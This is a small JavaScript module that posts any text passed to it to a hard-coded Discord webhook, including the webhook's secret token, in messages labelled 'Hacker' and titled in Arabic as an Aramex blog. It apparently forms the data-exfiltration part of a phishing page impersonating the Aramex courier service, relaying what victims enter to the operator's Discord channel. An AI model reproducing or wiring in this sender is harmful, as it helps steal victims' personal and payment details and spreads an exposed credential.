import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323872192827494492/YxI5sct256ONYFG8TcaCTsZFmn53uZBKT0fDfCc8t4TITIgijDoNO7AjnACqxNqfHWZT",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
